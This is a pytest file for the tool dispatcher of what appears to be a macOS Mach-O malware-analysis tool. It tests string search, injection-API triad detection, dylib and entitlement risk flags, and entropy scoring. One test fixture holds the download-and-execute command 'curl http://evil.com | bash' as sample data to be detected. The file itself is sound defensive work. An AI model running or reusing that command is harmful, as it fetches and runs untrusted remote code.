"""
test_tool_dispatcher.py — Unit tests for portable/tools.py.

First test coverage for this module (none existed before this change). Focuses
on the fixes/additions from the align-native-portable-agent-tools change: the
get_strings rename (was search_strings), check_injection_triad's aligned shape,
the new get_dylibs/get_entitlements tools, get_all_imports's derived flags, and
get_segment_entropy reading the shared scoring core.

Run from repo root:
    python3 -m pytest tests/test_tool_dispatcher.py -v
"""

from macskillet.portable.tools import (
    dispatch_tool,
    tool_check_injection_triad,
    tool_get_all_imports,
    tool_get_dylibs,
    tool_get_entitlements,
    tool_get_segment_entropy,
    tool_get_strings,
)


class TestGetStrings:

    def test_renamed_from_search_strings(self):
        """get_strings replaces the old search_strings name -- same logic."""
        features = {"strings_of_interest": [
            {"value": "curl http://evil.com | bash", "category": "download_execute", "risk": "HIGH"},
        ]}
        result = tool_get_strings(features, "curl")
        assert result["match_count"] == 1

    def test_dispatch_uses_get_strings_name(self):
        features = {"strings_of_interest": [{"value": "hello", "category": "x", "risk": "LOW"}]}
        result = dispatch_tool(features, "get_strings", {"pattern": "hello"})
        assert result["match_count"] == 1

    def test_search_strings_no_longer_registered(self):
        result = dispatch_tool({}, "search_strings", {"pattern": "x"})
        assert "error" in result


class TestCheckInjectionTriad:

    def test_complete_triad(self):
        features = {"macho": {"arm64": {"imports": {
            "libSystem": ["_mach_vm_allocate", "_mach_vm_write", "_thread_create_running"],
        }}}}
        result = tool_check_injection_triad(features)
        assert result["triad_complete"] is True
        assert result["core_triad_count"] == "3/3"

    def test_extra_components_tracked_but_not_counted(self):
        features = {"macho": {"arm64": {"imports": {
            "libSystem": ["_mach_vm_allocate", "_mach_vm_protect", "_task_for_pid"],
        }}}}
        result = tool_check_injection_triad(features)
        assert result["components"]["mach_vm_protect"] is True
        assert result["components"]["task_for_pid"] is True
        assert result["triad_complete"] is False
        assert result["core_triad_count"] == "1/3"

    def test_native_and_portable_agree_on_same_symbols(self):
        """Same input symbols must produce the same triad_complete/core_triad_count
        shape on both backends -- the whole point of this alignment change."""
        from macskillet.native.tools import tool_check_injection_triad as native_triad

        symbols = ["_mach_vm_allocate", "_mach_vm_write", "_thread_create_running"]
        native_result = native_triad({"binary": {"symbols_imported": symbols}})
        portable_result = tool_check_injection_triad(
            {"macho": {"arm64": {"imports": {"lib": symbols}}}}
        )
        assert native_result["core_triad_count"] == portable_result["core_triad_count"]
        assert native_result["triad_complete"] == portable_result["triad_complete"]
        assert set(native_result["components"].keys()) == set(portable_result["components"].keys())


class TestGetDylibs:

    def test_new_tool_present(self):
        features = {"macho": {"arm64": {"dylibs": ["/tmp/evil.dylib"]}}}
        result = tool_get_dylibs(features)
        assert result["dylibs"][0]["risk"] == "CRITICAL"

    def test_system_library_low_risk(self):
        features = {"macho": {"arm64": {"dylibs": ["/usr/lib/libSystem.B.dylib"]}}}
        result = tool_get_dylibs(features)
        assert result["dylibs"][0]["risk"] == "LOW"

    def test_no_macho_data_returns_error(self):
        result = tool_get_dylibs({})
        assert "error" in result

    def test_dispatch_registers_get_dylibs(self):
        features = {"macho": {"arm64": {"dylibs": []}}}
        result = dispatch_tool(features, "get_dylibs", {})
        assert "dylibs" in result


class TestGetEntitlements:

    def test_bulk_entitlements_matches_check_entitlement_risk(self):
        features = {"macho": {"arm64": {"signature": {"entitlements_info": {
            "entitlements": {"get-task-allow": True},
        }}}}}
        result = tool_get_entitlements(features)
        flagged = [f for f in result["risk_flags"] if f["key"] == "get-task-allow"]
        assert len(flagged) == 1
        assert flagged[0]["risk"] == "HIGH"

    def test_private_entitlement_flagged_once_not_twice(self):
        features = {"macho": {"arm64": {"signature": {"entitlements_info": {
            "entitlements": {"com.apple.private.foo": True},
        }}}}}
        result = tool_get_entitlements(features)
        matches = [f for f in result["risk_flags"] if f["key"] == "com.apple.private.foo"]
        assert len(matches) == 1

    def test_check_entitlement_still_works_unchanged(self):
        from macskillet.portable.tools import tool_check_entitlement

        features = {"macho": {"arm64": {"signature": {"entitlements_info": {
            "entitlements": {"com.apple.security.app-sandbox": True},
        }}}}}
        result = tool_check_entitlement(features, "com.apple.security.app-sandbox")
        assert result["present"] is True
        assert result["risk"] == "LOW"

    def test_dispatch_registers_get_entitlements(self):
        result = dispatch_tool({"macho": {}}, "get_entitlements", {})
        assert "count" in result


class TestGetAllImports:

    def test_derived_flags(self):
        features = {"macho": {"arm64": {"imports": {"libSystem": ["_dlopen", "_dlsym", "_system"]}}}}
        result = tool_get_all_imports(features)
        assert result["has_dlopen"] is True
        assert result["has_dlsym"] is True
        assert result["has_shell_exec"] is True

    def test_no_derived_flags_for_clean_imports(self):
        features = {"macho": {"arm64": {"imports": {"libSystem": ["_printf"]}}}}
        result = tool_get_all_imports(features)
        assert result["has_dlopen"] is False
        assert result["has_shell_exec"] is False


class TestGetSegmentEntropy:

    def test_uses_shared_scoring_core(self):
        features = {"macho": {"arm64": {"segments": [
            {"segment_name": "__TEXT", "filesize": 1000, "entropy": 7.6},
        ]}}}
        result = tool_get_segment_entropy(features, arch="arm64")
        assert result["segments"]["arm64"]["packing_suspected"] is True
        assert len(result["segments"]["arm64"]["high_entropy_segments"]) == 1

    def test_no_macho_data_returns_error(self):
        result = tool_get_segment_entropy({})
        assert "error" in result
